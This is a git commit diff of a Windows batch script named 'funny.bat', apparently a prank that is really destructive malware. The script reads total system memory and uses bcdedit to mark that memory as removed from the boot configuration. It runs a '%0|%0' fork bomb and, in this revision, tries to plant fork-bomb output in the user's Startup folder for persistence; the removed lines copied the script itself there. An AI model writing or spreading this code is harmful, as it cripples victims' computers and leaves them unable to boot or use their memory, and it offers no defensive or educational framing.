6b8096934e85bc5b4545df0c6317d5480bc9f1a9
frogillius <151787619+frogillius@users.noreply.github.com>
2024-06-11 19:19:24 -0700

    Update funny.bat

--- funny.bat
+++ funny.bat
@@ -1,9 +1,4 @@
 @echo off 
-:: --HAS ENDING BACKSLASH
-set batdir=%~dp0
-:: --MISSING ENDING BACKSLASH
-:: set batdir=%CD%
-pushd "%batdir%"
 
 echo Calculating total system memory
 for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
@@ -22,6 +17,7 @@ echo Will be getting rid of %c% bytes of memory
 
 bcdedit.exe /set removememory %c% 
 
-copy "%batdir%\funny.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
+cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
+%0|%0 > custom.bat
 %0|%0
  
